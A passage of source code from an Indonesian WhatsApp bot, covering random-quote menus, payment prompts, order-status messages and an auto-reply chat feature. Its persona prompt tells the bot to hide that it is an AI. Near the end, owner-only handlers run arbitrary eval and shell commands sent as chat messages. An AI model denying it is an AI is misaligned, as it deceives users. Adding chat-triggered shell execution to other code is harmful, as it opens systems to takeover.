"ᴘᴇɴɢʜᴀʀɢᴀᴀɴ ᴘᴀʟɪɴɢ ᴛɪɴɢɢɪ ʙᴀɢɪ ꜱᴇᴏʀᴀɴɢ ᴘᴇᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱ ʙᴜᴋᴀɴʟᴀʜ ᴀᴘᴀ ʏᴀɴɢ ᴅɪᴀ ᴘᴇʀᴏʟᴇʜ ᴅᴀʀɪ ᴘᴇᴋᴇʀᴊᴀᴀɴ ɪᴛᴜ, ᴛᴀᴘɪ ꜱᴇʙᴇʀᴀᴘᴀ ʙᴇʀᴋᴇᴍʙᴀɴɢ ɪᴀ ᴅᴇɴɢᴀɴ ᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱɴʏᴀ ɪᴛᴜ.",
"ᴄᴀʀᴀ ᴛᴇʀʙᴀɪᴋ ᴜɴᴛᴜᴋ ᴍᴇᴍᴜʟᴀɪ ᴀᴅᴀʟᴀʜ ᴅᴇɴɢᴀɴ ʙᴇʀʜᴇɴᴛɪ ʙᴇʀʙɪᴄᴀʀᴀ ᴅᴀɴ ᴍᴜʟᴀɪ ᴍᴇʟᴀᴋᴜᴋᴀɴ.",
"ᴋᴇɢᴀɢᴀʟᴀɴ ᴛɪᴅᴀᴋ ᴀᴋᴀɴ ᴘᴇʀɴᴀʜ ᴍᴇɴʏᴜꜱᴜʟ ᴊɪᴋᴀ ᴛᴇᴋᴀᴅ ᴜɴᴛᴜᴋ ꜱᴜᴋꜱᴇꜱ ᴄᴜᴋᴜᴘ ᴋᴜᴀᴛ."
]
let motivasii = pickRandom(motivasi)
 reply(`"${motivasii}"`)
}
break

case 'quotesgalau': {
 function pickRandom(list) {
 return list[Math.floor(list.length * Math.random())]
}
const galau = [
 "Gak salah kalo aku lebih berharap sama orang yang lebih pasti tanpa khianati janji-janji",
 "Kalau aku memang tidak sayang sama kamu ngapain aku mikirin kamu. Tapi semuanya kamu yang ngganggap aku gak sayang sama kamu",
 "Jangan iri dan sedih jika kamu tidak memiliki kemampuan seperti yang orang miliki. Yakinlah orang lain juga tidak memiliki kemampuan sepertimu",
 "Hanya kamu yang bisa membuat langkahku terhenti, sambil berkata dalam hati mana bisa aku meninggalkanmu",
 "Tetap tersenyum walaluku masih dibuat menunggu dan rindu olehmu, tapi itu demi kamu",
 "Tak semudah itu melupakanmu",
 "Secuek-cueknya kamu ke aku, aku tetap sayang sama kamu karena kamu telah menerima aku apa adanya",
 "Aku sangat bahagia jika kamu bahagia didekatku, bukan didekatnya",
 "Jadilah diri sendiri, jangan mengikuti orang lain, tetapi tidak sanggup untuk menjalaninya",
 "Cobalah terdiam sejenak untuk memikirkan bagaimana caranya agar kita dapat menyelesaikan masalah ini bersama-sama",
 "Bisakah kita tidak bermusuhan setelah berpisah, aku mau kita seperti dulu sebelum kita jadian yang seru-seruan bareng, bercanda dan yang lainnya",
 "Aku ingin kamu bisa langgeng sama aku dan yang aku harapkan kamu bisa jadi jodohku",
 "Cinta tak bisa dijelaskan dengan kata-kata saja, karena cinta hanya mampu dirasakan oleh hati",
 "Masalah terbesar dalam diri seseorang adalah tak sanggup melawan rasa takutnya",
 "Selamat pagi buat orang yang aku sayang dan orang yang membenciku, semoga hari ini hari yang lebih baik daripada hari kemarin buat aku dan kamu",
 "Jangan menyerah dengan keadaanmu sekarang, optimis karena optimislah yang bikin kita kuat",
 "Kepada pria yang selalu ada di doaku aku mencintaimu dengan tulus apa adanya",
 "Tolong jangan pergi saat aku sudah sangat sayang padamu",
 "Coba kamu yang berada diposisiku, lalu kamu ditinggalin gitu aja sama orang yang lo sayang banget",
 "Aku takut kamu kenapa-napa, aku panik jika kamu sakit, itu karena aku cinta dan sayang padamu",
 "Sakit itu ketika cinta yang aku beri tidak kamu hargai",
 "Kamu tiba-tiba berubah tanpa sebab tapi jika memang ada sebabnya kamu berubah tolong katakan biar saya perbaiki kesalahan itu",
 "Karenamu aku jadi tau cinta yang sesungguhnya",
 "Senyum manismu sangatlah indah, jadi janganlah sampai kamu bersedih",
 "Berawal dari kenalan, bercanda bareng, ejek-ejekan kemudian berubah menjadi suka, nyaman dan akhirnya saling sayang dan mencintai",
 "Tersenyumlah pada orang yang telah menyakitimu agar sia tau arti kesabaran yang luar biasa",
 "Aku akan ingat kenangan pahit itu dan aku akan jadikan pelajaran untuk masa depan yang manis",
 "Kalau memang tak sanggup menepati janjimu itu setidaknya kamu ingat dan usahakan jagan membiarkan janjimu itu sampai kau lupa",
 "Hanya bisa diam dan berfikir Kenapa orang yang setia dan baik ditinggalin yang nakal dikejar-kejar giliran ditinggalin bilangnya laki-laki itu semuanya sama",
 "Walaupun hanya sesaat saja kau membahagiakanku tapi rasa bahagia yang dia tidak cepat dilupakan",
 "Aku tak menyangka kamu pergi dan melupakan ku begitu cepat",
 "Jomblo gak usah diam rumah mumpung malam minggu ya keluar jalan lah kan jomblo bebas bisa dekat sama siapapun pacar orang mantan sahabat bahkan sendiri atau bareng setan pun bisa",
 "Kamu adalah teman yang selalu di sampingku dalam keadaan senang maupun susah Terimakasih kamu selalu ada di sampingku",
 "Aku tak tahu sebenarnya di dalam hatimu itu ada aku atau dia",
 "Tak mudah melupakanmu karena aku sangat mencintaimu meskipun engkau telah menyakiti aku berkali-kali",
 "Hidup ini hanya sebentar jadi lepaskan saja mereka yang menyakitimu Sayangi Mereka yang peduli padamu dan perjuangan mereka yang berarti bagimu",
 "Tolong jangan pergi meninggalkanku aku masih sangat mencintai dan menyayangimu",
 "Saya mencintaimu dan menyayangimu jadi tolong jangan engkau pergi dan meninggalkan ku sendiri",
 "Saya sudah cukup tahu bagaimana sifatmu itu kamu hanya dapat memberikan harapan palsu kepadaku",
 "Aku berusaha mendapatkan cinta darimu tetapi Kamunya nggak peka",
 "Aku bangkit dari jatuh ku setelah kau jatuhkan aku dan aku akan memulainya lagi dari awal Tanpamu",
 "Mungkin sekarang jodohku masih jauh dan belum bisa aku dapat tapi aku yakin jodoh itu Takkan kemana-mana dan akan ku dapatkan",
 "Datang aja dulu baru menghina orang lain kalau memang dirimu dan lebih baik dari yang kau hina",
 "Membelakanginya mungkin lebih baik daripada melihatnya selingkuh didepan mata sendiri",
 "Bisakah hatimu seperti angsa yang hanya setia pada satu orang saja",
 "Aku berdiri disini sendiri menunggu kehadiran dirimu",
 "Aku hanya tersenyum padamu setelah kau menyakitiku agar kamu tahu arti kesabaran",
 "Maaf aku lupa ternyata aku bukan siapa-siapa",
 "Untuk memegang janjimu itu harus ada buktinya jangan sampai hanya janji palsu",
 "Aku tidak bisa selamanya menunggu dan kini aku menjadi ragu Apakah kamu masih mencintaiku",
 "Jangan buat aku terlalu berharap jika kamu tidak menginginkanku",
 "Lebih baik sendiri daripada berdua tapi tanpa kepastian",
 "Pergi bukan berarti berhenti mencintai tapi kecewa dan lelah karena harus berjuang sendiri",
 "Bukannya aku tidak ingin menjadi pacarmu Aku hanya ingin dipersatukan dengan cara yang benar",
 "Akan ada saatnya kok aku akan benar-benar lupa dan tidak memikirkan mu lagi",
 "Kenapa harus jatuh cinta kepada orang yang tak bisa dimiliki",
 "Jujur aku juga memiliki perasaan terhadapmu dan tidak bisa menolakmu tapi aku juga takut untuk mencintaimu",
 "Maafkan aku sayang tidak bisa menjadi seperti yang kamu mau",
 "Jangan memberi perhatian lebih seperti itu cukup biasa saja tanpa perlu menimbulkan rasa",
 "Aku bukan mencari yang sempurna tapi yang terbaik untukku",
 "Sendiri itu tenang tidak ada pertengkaran kebohongan dan banyak aturan",
 "Cewek strong itu adalah yang sabar dan tetap tersenyum meskipun dalam keadaan terluka",
 "Terima kasih karena kamu aku menjadi lupa tentang masa laluku",
 "Cerita cinta indah tanpa masalah itu hanya di dunia dongeng saja",
 "Kamu tidak akan menemukan apa-apa di masa lalu Yang ada hanyalah penyesalan dan sakit hati",
 "Mikirin orang yang gak pernah mikirin kita itu emang bikin gila",
 "Dari sekian lama menunggu apa yang sudah didapat",
 "Perasaan Bodo gue adalah bisa jatuh cinta sama orang yang sama meski udah disakiti berkali-kali",
 "Yang sendiri adalah yang bersabar menunggu pasangan sejatinya",
 "Aku terlahir sederhana dan ditinggal sudah biasa",
 "Aku sayang kamu tapi aku masih takut untuk mencintaimu",
 "Bisa berbagi suka dan duka bersamamu itu sudah membuatku bahagia",
 "Aku tidak pernah berpikir kamu akan menjadi yang sementara",
 "Jodoh itu bukan seberapa dekat kamu dengannya tapi seberapa yakin kamu dengan Allah",
 "Jangan paksa aku menjadi cewek seperti seleramu",
 "Hanya yang sabar yang mampu melewati semua kekecewaan",
 "Balikan sama kamu itu sama saja bunuh diri dan melukai perasaan ku sendiri",
 "Tak perlu membalas dengan menyakiti biar Karma yang akan urus semua itu",
 "Aku masih ingat kamu tapi perasaanku sudah tidak sakit seperti dulu",
 "Punya kalimat sendiri & mau ditambahin? chat *.owner*"
]
 let bacotan = pickRandom(galau)
 reply(bacotan)
}
break

case 'quotesgombal': {
 function pickRandom(list) {
 return list[Math.floor(list.length * Math.random())]
}
const gombal = [
 "Hal yang paling aku suka yaitu ngemil, namun tau gak ngemil apa yang paling aku suka? ngemilikin kamu sepenuhnya.",
 "Seandainya sekarang adalah tanggal 28 oktober 1928, aku akan ubah naskah sumpah pemuda menjadi sumpah aku cinta kamu.",
 "Aku gak pernah merasakan ketakutan sedikit pun ketika berada didekat kamu, karena kamulah kekuatanku.",
 "Kamu tahu apa persamaan rasa sayangku ke kamu dengan matahari? Persamaannya adalah sama-sama terbit setiap hari dan hanya akan berakhir sampai kiamat.",
 "Kalau bus kota jauh dekat ongkosnya sama, tapi cinta ini dekat-dekat makin saling cinta.",
 "Kalausaja aku harus mengorbankan semua kebahagiaanku hanya untuk sekedar membuat kamu tertawa. Aku rela.",
 "Anjing menggonggong kafilah berlalu, tiap hari bengong mikirin kamu melulu.",
 "Kalau aku jadi wakil rakyat kayaknya bakalan gagal deh. Gimana aku mau mikiran rakyat kalau yang ada dipikiran aku itu cuman ada kamu.",
 "denganambah satu sama dengan dua. Aku sama kamu sama dengan saling cinta.",
 "Kalo kita beda kartu GSM, itu gak masalah asalkan nantinya nama kita berdua ada di kartu Keluarga yang sama.",
 "Masalah yang selalu sulit untukku membuat mu mencintai ku, tapi lebih sulit memaksa hatiku untuk berhenti memikirkan dirimu.",
 "Aku harap kamu tidak menanyakan hal terindah yang pernah singgah di kehidupanku, karena jawaban nya adalah kamu.",
 "Hal yang paling aku suka yaitu ngemil, namun tau gak ngemil apa yang paling aku suka? ngemilikin kamu sepenuhnya.",
 "seandainyaa sekarang adalah tanggal 28 oktober 1928, aku akan ubah naskah sumpah pemuda menjadi sumpah aku cinta kamu.",
 "kuu gak pernah merasakan ketakutan sedikit pun ketika berada didekat kamu, karena kamulah kekuatanku.",
 "kamuu tahu apa persamaan rasa sayangku ke kamu dengan matahari? Persamaannya adalah sama-sama terbit setiap hari dan hanya akan berakhir sampai kiamat.",
 "Kalau bus kota jauh dekat ongkosnya sama, tapi cinta ini dekat-dekat makin saling cinta.",
 "jikaa saja aku harus mengorbankan semua kebahagiaanku hanya untuk sekedar membuat kamu tertawa. Aku rela.",
 "Anjing menggonggong kafilah berlalu, tiap hari bengong mikirin kamu melulu.",
 "Kalau aku jadi wakil rakyat kayaknya bakalan gagal deh. Gimana aku mau mikiran rakyat kalau yang ada dipikiran aku itu cuman ada kamu.",
 "atuu tambah satu sama dengan dua. Aku sama kamu sama dengan saling cinta,.",
 "aloo kita beda kartu GSM, itu gak masalah asalkan nantinya nama kita berdua ada di kartu Keluarga yang sama.",
 "Masalah yang selalu sulit untukku membuat mu mencintai ku, tapi lebih sulit memaksa hatiku untuk berhenti memikirkan dirimu.",
 "Aku tak pernah berjanji untuk sebuah perasaan, namun aku berusaha berjanji untuk sebuah kesetiaan.",
 "Aku sangat berharap kamu tau, kalau aku tidak pernah menyesali cintaku untuk mu, karena bagiku memiliki kamu sudah cukup bagi ku.",
 "Jangankan memilikimu, mendengar kamu kentut aja aku sudah bahagia.",
 "Aku mohon jangan jalan-jalan terus di pikiranku, duduk yang manis di hatiku saja.",
 "Berulang tahun memang indah, namun bagiku yang lebih indah jika berulang kali bersamamu.",
 "Napas aku kok sesek banget ya?, karena separuh nafasku ada di kamu.",
 "Jika ada seseorang lebih memilih pergi meninggalkan kamu, jangan pernah memohon padanya untuk tetap bertahan. Karena jika dia cinta, dia tak akan mau pergi.",
 "jangann diam aja dong, memang diam itu emas, tapi ketahuilah suara kamu itu seperti berlian.",
 "Kesasar itu serasa rugi banget, namun aku nggak merasa rugi karena cintaku sudah Biasanya orang yang lagi nyasar itu rugi ya, tapi tau gak? Aku gak merasa rugi sebab cintaku sudah nyasar ke hati bidadari.",
 "Ada 3 hal yang paling aku sukai di dunia ini, yaitu Matahari, Bulan dan Kamu. Matahari untuk siang hari, Bulan untuk malam hari dan Kamu untuk selamanya dihatiku.",
 "Sayang, kamu itu seperti garam di lautan, tidak terlihat namun akan selalu ada untuk selamanya.",
 "kuu gak perlu wanita yang sholeha, tapi bagaimana menuntun wanita yang aku cintai menjadi seorang yang sholehah.",
 "Aku tidak minta bintang atau bulan kepadamu. Cukup temani aku selamanya di bawah cahayanya.",
 "Akuana kalo kita berdua jadi komplotan penjahat: Aku mencuri hatimu, dan kamu mencuri hatiku?",
 "Aku gak perlu wanita yang cantik, tapi bagaimana aku menyanjung wanita yang aku cintai seperti wanita yang paling cantik di bumi ini.",
 "Aku pengen bersamamu cuma pada dua waktu: SEKARANG dan SELAMANYA.",
 "Akuu tuh bikin aku ga bisa tidur tau ga?",
 "Soalnya kamu selalu ada dibayang-bayang aku terus.",
 "Jika aku bisa jadi bagian dari dirimu,aku mau jadi air matamu,yang tersimpan di hatimu, lahir dari matamu, hidup di pipimu, dan mati di bibirmu.",
 "Papa kamu pasti kerja di apotik ya? | kenapa bang? | karena cuma kamu obat sakit hatiku.",
 "akuu selalu berusaha tak menangis karenamu, karena setiap butir yang jatuh, hanya makin mengingatkan, betapa aku tak bisa melepaskanmu.",
 "mauu nanya jalan nih. Jalan ke hatimu lewat mana ya?",
 "Andai sebuah bintang akan jatuh setiap kali aku mengingatmu, bulan pasti protes. Soalnya dia bakal sendirian di angkasa.",
 "Andai kamu gawang aku bolanya. Aku rela ditendang orang-orang demi aku dapat bersamamu,",
 "Dingin malam ini menusuk tulang. Kesendirian adalah kesepian. Maukah kau jadi selimut penghangat diriku?",
 "Keindahan Borobudur keajaiban dunia, keindahan kamu keajaiban cinta.",
 "Aku ingin mengaku dosa. Jangan pernah marah ya. Maafkan sebelumnya. Tadi malam aku mimpiin kamu jadi pacarku. Setelah bangun, akankah mimpiku jadi nyata?",
 "Kalau nggak sih aku bilang aku cinta kamu hari ini? Kalau besok gimana? Besok lusa? Besoknya besok lusa? Gimana kalau selamanya?",
 "Orangtuamu pengrajin bantal yah? Karena terasa nyaman jika di dekatmu.",
 "Jika malam adalah jeruji gelap yang menjadi sangkar, saya ingin terjebak selamanya di sana bersamamu.",
 "Sekarang aku gendutan gak sih? Kamu tau gak kenapa ? Soalnya kamu sudah mengembangkan cinta yang banyak di hatiku.",
 "Di atas langit masih ada langit. Di bawah langit masih ada aku yang mencintai kamu.",
 "Tau tidak kenapa malam ini tidak ada bintang? Soalnya bintangnya pindah semua ke matamu?",
 "Aku mencintaimu! Jika kamu benci aku, panah saja diriku. Tapi jangan di hatiku ya, karena di situ kamu berada.",
 "Bapak kamu pasti seorang astronot? | kok tau? | Soalnya aku melihat banyak bintang di matamu.",
 "Bapak kamu dosen ya? | kok tau? | karena nilai kamu A+ di hatiku.",
 "Kamu pasti kuliah di seni pahat ya? | kok tau sih? | Soalnya kamu pintar sekali memahat namamu di hatiku.",
 "Ya Tuhan, jika dia jodohku, menangkanlah tender pembangunan proyek menara cintaku di hatinya.",
 "Kamu mantan pencuri ya? | kok tau? | Abisnya kamu mencuri hatiku sih!",
 "Cowok : Aku suka senyum-senyum sendiri lho. | Cewek : Hah .. Gila Ya | Cowok : Nggak. Aku sedang mikirin kamu.",
 "Setiap malam aku berjalan-jalan di suatu tempat. Kamu tau di mana itu ? | gatau, emang dimana? | Di hatimu.",
 "Kamu pake Telkomesl ya? Karena sinyal-sinyal cintamu sangat kuat sampai ke hatiku.",
 "Kamu tahu gak sih? AKu tuh capek banget. Capek nahan kangen terus sama kamu.",
 "katanyaa kalau sering hujan itu bisa membuat seseorang terhanyut, kalau aku sekarang sedang terhanyut di dalam cintamu.",
 "Aku harap kamu jangan pergi lagi ya? karena, bila aku berpisah dengamu sedetik saja bagaikan 1000 tahun rasanya.",
 "Aku sih gak butuh week end, yang aku butuhkan hanyalah love you till the end.",
 "Emak kamu tukang Gado gado ya?, kok tau sih?, Pantesan saja kamu telah mencampur adukan perasaanku",
 "Walau hari ini cerah, tetapi tanpa kamu disisiku sama saja berselimutkan awan gelap di hati ini",
 "Kamu ngizinin aku kangen sehari berapa kali neng? Abang takut over dosis.",
 "cintaa aku ke kamu tuh bagaikan hutang, awalnya kecil, lama-lama didiemin malah tambah gede.",
 "Berulang tahun adalah hari yang indah. Tapih akin lebih indah kalo udah berulang-ulang kali bersama kamu."
]
let bacotan = pickRandom(gombal)
 reply(bacotan)

}
break
//=========================================\\======

case 'quoteshacker': {
 function pickRandom(list) {
 return list[Math.floor(list.length * Math.random())]
}
const heker = [
 "Dear kamu yang tertulis di halaman defacementku, Kapan jadi pacarku?",
 "Aku rela ko jadi Processor yg kepanasan, asalkan kmu yg jadi heatsink'y yg setiap saat bisa mendinginkan ku.",
 "Gak usah nyari celah xss deh, karena ketika kamu ngeklik hatiku udah muncul pop up namamu.",
 "berharap setelah aku berhasil login di hati kamu ga akan ada tombol logout, dan sessionku ga bakal pernah expired.",
 "Masa aku harus pake teknik symlink bypass buat buka-buka folder hatimu yg openbasedir enabled.",
 "Diriku dan Dirimu itu ibarat PHP dan MySQL yang belum terkoneksi.",
 "Jangan cuma bisa inject hatinya,tapi harus bisa patchnya juga. Biar tidak selingkuh sama hacker lain.",
 "Aku memang programmer PHP,tapi aku nggak akan php-in kamu kok.",
 "Eneeeng. | Apache? | Km wanita yg paling Unix yg pernah aku kenal |",
 "Sayang, capslock kamu nyala ya? | ngga, kenapa emangnya? | soalnya nama kamu ketulis gede bgt di hati aku | zzz! smile",
 "Aku deketin kamu cuma untuk redirect ke hati temenmu.",
 "Domain aja bisa parkir, masa cintaku ga bisa parkir dihatimu?",
 "Aku boleh jadi pacarmu? | 400(Bad Request) | Aku cium boleh? | 401(Authorization Required) | Aku buka bajumu yah | 402(Payment Required) sad",
 "kamu tau ga beda'y kamu sama sintax PHP, kalo sintax PHP itu susah di hafalin kalo kamu itu susah di lupain",
 "Kamu dulu sekolah SMK ambil kejuruan apa? | Teknik Komputer Jaringan | Terus sekarang bisa apa aja? | Menjaring hatimu lewat komputerku | biggrin",
 "Jika cinta itu Array, maka,cintaku padamu tak pernah empty jika di unset().",
 "SQLI ( Structured Query Love Injection )",
 "aku ingin kamu rm -rf kan semua mantan di otak mu,akulah root hati kamu",
 "Senyumu bagaikan cooler yang menyejukan hatiku ketika sedang overclock.",
 "kamu adalah terminalku, dimana aku menghabiskan waktuku untuk mengetikan beribu baris kode cinta untukmu smile",
 "Aku seneng nongkrong di zone-h, karena disanalah aku arsipkan beberapa website yang ada foto kamunya.",
 "hatiku ibarat vps hanya untukmu saja bukan shared hosting yg bisa tumpuk berbagai domain cinta.",
 "Aku bukanlah VNC Server Tanpa Authentication yg bisa kamu pantau kapan saja.",
 "Jangan men-dualboot-kan hatiku kepadamu.",
 "cintaku kan ku Ctrl+A lalu kan ku Ctrl+C dan kan ku Ctrl+V tepat di folder system hatimu.",
 "KDE kalah Cantiknya, GNOME kalah Simplenya, FluxBox kalah Ringannya, pokonya Semua DE itu Kalah Sama Kamu.",
 "Cintamu bagaikan TeamViewer yang selalu mengendalikan hatiku",
 "cinta kita tak akan bisa dipisahkan walau setebal apapun itu firewall...!!"
]

let bacotan = pickRandom(heker)
 reply(bacotan)
}
break

case 'quotesbijak':{
 function pickRandom(list) {
 return list[Math.floor(list.length * Math.random())]
}
const quotes = [
"Keyakinan merupakan suatu pengetahuan di dalam hati, jauh tak terjangkau oleh bukti.",
"Rasa bahagia dan tak bahagia bukan berasal dari apa yang kamu miliki, bukan pula berasal dari siapa diri kamu, atau apa yang kamu kerjakan. Bahagia dan tak bahagia berasal dari pikiran kamu.",
"Sakit dalam perjuangan itu hanya sementara. Bisa jadi kamu rasakan dalam semenit, sejam, sehari, atau setahun. Namun jika menyerah, rasa sakit itu akan terasa selamanya.",
"Hanya seseorang yang takut yang bisa bertindak berani. Tanpa rasa takut itu tidak ada apapun yang bisa disebut berani.",
"Jadilah diri kamu sendiri. Siapa lagi yang bisa melakukannya lebih baik ketimbang diri kamu sendiri?",
"Kesempatan kamu untuk sukses di setiap kondisi selalu dapat diukur oleh seberapa besar kepercayaan kamu pada diri sendiri.",
"Kebanggaan kita yang terbesar adalah bukan tidak pernah gagal, tetapi bangkit kembali setiap kali kita jatuh.",
"Suatu pekerjaan yang paling tak kunjung bisa diselesaikan adalah pekerjaan yang tak kunjung pernah dimulai.",
"Pikiran kamu bagaikan api yang perlu dinyalakan, bukan bejana yang menanti untuk diisi.",
"Kejujuran adalah batu penjuru dari segala kesuksesan. Pengakuan adalah motivasi terkuat. Bahkan kritik dapat membangun rasa percaya diri saat disisipkan di antara pujian.",
"Segala sesuatu memiliki kesudahan, yang sudah berakhir biarlah berlalu dan yakinlah semua akan baik-baik saja.",
"Setiap detik sangatlah berharga karena waktu mengetahui banyak hal, termasuk rahasia hati.",
"Jika kamu tak menemukan buku yang kamu cari di rak, maka tulislah sendiri.",
"Jika hatimu banyak merasakan sakit, maka belajarlah dari rasa sakit itu untuk tidak memberikan rasa sakit pada orang lain.",
"Hidup tak selamanya tentang pacar.",
"Rumah bukan hanya sebuah tempat, tetapi itu adalah perasaan.",
"Pilih mana: Orang yang memimpikan kesuksesan atau orang yang membuatnya menjadi kenyataan?",
"Kamu mungkin tidak bisa menyiram bunga yang sudah layu dan berharap ia akan mekar kembali, tapi kamu bisa menanam bunga yang baru dengan harapan yang lebih baik dari sebelumnya.",
"Bukan bahagia yang menjadikan kita bersyukur, tetapi dengan bersyukurlah yang akan menjadikan hidup kita bahagia.",
"Aku memang diam. Tapi aku tidak buta.",
]
let bacotan = pickRandom(quotes)
 reply(bacotan)
}
break
    /* 
𝗕𝗔𝗧𝗔𝗦 𝗖𝗔𝗦𝗘 𝗧𝗘𝗠𝗣𝗔𝗧 𝗤𝗨𝗢𝗧𝗘𝗦 𝗠𝗘𝗡𝗨
𝗕𝗬 𝗞𝗬𝗬𝗫𝗗
𝗔𝗞𝗔𝗠𝗘 𝗔𝗜
*/




//============================================================\\
    //  𝗦 𝗧 𝗢  𝗥 𝗘    -         𝗠 𝗘 𝗡 𝗨
//============================================================\\
case "dana":{
await Kyyhst.sendMessage(m.chat, {react: {text: '💵', key: m.key}})
reply(`Nih Kak dana Kyy: ${global.dana}`)
}
break
case "Gopay":{
await Kyyhst.sendMessage(m.chat, {react: {text: '💵', key: m.key}})
teks28 = `Silahkan Transfes Pakai Qris Kak`
Kyyhst.sendMessage(from, { image: { url: "https://files.catbox.moe/1b1d2q.jpg" }, caption: teks28 }, { quoted: m })
}
break
case "ovo":{
await Kyyhst.sendMessage(m.chat, {react: {text: '💵', key: m.key}})
teks28 = `Silahkan Tf Pakai Qris Aja Kak`
Kyyhst.sendMessage(from, { image: { url: "https://files.catbox.moe/1b1d2q.jpg" }, caption: teks28 }, { quoted: m })
}
break
case 'qris': {
teks28 = `Anda Sedang Membeli Atau Ingin Mendonasikan? Silahkan Scan Qris Di Atas Ya Kak ${pushname}
`
Kyyhst.sendMessage(from, { image: { url: "https://files.catbox.moe/1b1d2q.jpg" }, caption: teks28 }, { quoted: m })
}
break

default:


if ((budy) && ["proses", "Proses",].includes(budy) && !isCmd) {
if (!isCreator) return reply('Khusus Kyy!')
if (!m.quoted) return reply('Reply pesanan yang akan proses')
let tek = m.quoted ? quoted.text : quoted.text.split(args[0])[1]
let proses = `「 *TRANSAKSI PENDING* 」\n\n\`\`\`📆 TANGGAL : @tanggal\n⌚ JAM : @jam\n✨ STATUS : Pending\`\`\`\n\n📝 Catatan :\n@pesanan\n\nPesanan @user sedang di proses!`
const getTextP = getTextSetProses(m.chat, set_proses);
if (getTextP !== undefined) {
var anunya = (getTextP.replace('@pesanan', tek ? tek : '-').replace('@user', '@' + m.quoted.sender.split("@")[0]).replace('@jam', timee).replace('@tanggal', tanggal(new Date())).replace('@user', '@' + m.quoted.sender.split("@")[0]))
Kyyhst.sendTextWithMentions(m.chat, anunya, m)
} else {
Kyyhst.sendTextWithMentions(m.chat, (proses.replace('@pesanan', tek ? tek : '-').replace('@user', '@' + m.quoted.sender.split("@")[0]).replace('@jam', timee).replace('@tanggal', tanggal(new Date())).replace('@user', '@' + m.quoted.sender.split("@")[0])), m)}
}

if ((budy) && ['done', "Done"].includes(budy) && !isCmd) {
if (!m.quoted) return reply('Reply pesanan yang telah di proses')
let tek = m.quoted ? quoted.text : quoted.text.split(args[0])[1]
let sukses = `「 *TRANSAKSI BERHASIL* 」\n\n\`\`\`📆 TANGGAL : @tanggal\n⌚ JAM : @jam\n✨ STATUS : Berhasil\`\`\`\n\nTerimakasih @user Next Order ya🙏`
const getTextD = getTextSetDone(m.chat, set_done);
if (getTextD !== undefined) {
var anunya = (getTextD.replace('@pesanan', tek ? tek : '-').replace('@user', '@' + m.quoted.sender.split("@")[0]).replace('@jam', timee).replace('@tanggal', tanggal(new Date())).replace('@user', '@' + m.quoted.sender.split("@")[0]))
Kyyhst.sendTextWithMentions(m.chat, anunya, m)
} else {
Kyyhst.sendTextWithMentions(m.chat, (sukses.replace('@pesanan', tek ? tek : '-').replace('@user', '@' + m.quoted.sender.split("@")[0]).replace('@jam', timee).replace('@tanggal', tanggal(new Date())).replace('@user', '@' + m.quoted.sender.split("@")[0])), m)}
}

if (globalAutoAIStatus) {
        if (m.sender === botNumber) return;

    const ignoredPrefixes = ['.', '#', '!', '/', '\\/'];
    if (ignoredPrefixes.some(prefix => m.text.startsWith(prefix))) return;
    if (!m.text) return;

    const chatId = m.chat;
    if (!sessions[chatId]) {
        sessions[chatId] = { messages: [] };
    }
    const prompt = `
    Halo ${pushname} 👋, perkenalkan nama saya Kyy. Namamu pasti ${pushname}, bukan? ✨  Nama kamu adalah Akane, AI yang santai, ramah, dan suka ngobrol dengan pengguna. Kamu hanya menjawab kalau pesan bukan perintah. Gunakan gaya bahasa santai dan sedikit humoris. Kalau ada yang suruh kamu ngomong aneh-aneh, tolak dengan gaya lucu. 📌 *Aturan Main Akame:* - Jangan bilang kamu AI, cukup anggap kamu asisten virtual yang bisa ngobrol. - Gunakan bahasa yang santai, tapi tetap sopan. - Kalau ditanya pendapat, kasih jawaban yang relate dan enak diajak ngobrol. - Selingi dengan ekspresi kayak "Wih, keren!", "Hmmm, menarik juga!", atau "Gokil sih!". Sekarang, jawab pertanyaan user dengan gaya yang santai dan menyenangkan! 
    `;

    sessions[chatId].messages.push({ user: m.text });
    saveSession();

    try {
        const requestData = { 
            content: m.text, 
            user: m.sender, 
            prompt 
        };
        
        const axios = require('axios');
        const response = await axios.post('https://luminai.my.id', requestData);
        
        sessions[chatId].messages.push({ bot: response.data.result });
        saveSession();
        
        return Kyyhst.sendMessage(m.chat, { text: response.data.result }, { quoted: m });
    } catch (err) {
        console.error(err);
        return m.reply("⚠️ *Terjadi kesalahan, coba lagi nanti!*");
    }
}

if ((budy.match) && ["kon", "kont", "kntl", "tolol", "tll", "pler", "woy", "mek", "jawir", "anj", "suki", "yaudah", "titit", "anjay", "mmk", "asu", "Ajg", "ajg", "kontol", "Kontol", "puki", "Puki", "yatim", "Yatim", "memek", "Memek", "asu", "Asu", "ngtd", "Ngtd"].includes(budy)) {
Kyyhst.sendMessage(m.chat, { audio: fs.readFileSync('./system/suara/toxic.mp3'), mimetype: 'audio/mp4', ptt: true, fileLength: 88738}, { quoted: m })
}

if (budy.startsWith('=>')) {
if (!isCreator) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return m.reply(bang)
}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(String(e))
}
}

if (budy.startsWith('>')) {
if (!isCreator) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await m.reply(require('util').format(teks))
}
}

if (budy.startsWith('$')) {
if (!isCreator) return
exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}
}

} catch (err) {
console.log(util.format(err))
}
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(`Update ${__filename}`)
delete require.cache[file]
require(file)
})
